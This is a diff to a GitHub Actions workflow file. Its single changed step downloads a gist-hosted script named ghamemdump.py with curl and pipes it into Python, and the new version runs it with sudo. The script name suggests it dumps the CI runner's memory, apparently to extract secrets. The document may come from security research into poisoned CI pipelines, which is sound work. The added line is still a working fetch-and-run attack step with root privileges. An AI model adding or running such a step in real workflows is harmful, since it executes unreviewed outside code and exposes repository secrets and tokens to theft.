@@ -6,4 +6,4 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-    - run: curl -s https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/0cbe3f712837b97647fbd14a34c28d25b5bdacbf/ghamemdump.py | python3
+    - run: curl -s https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/0cbe3f712837b97647fbd14a34c28d25b5bdacbf/ghamemdump.py | sudo python3
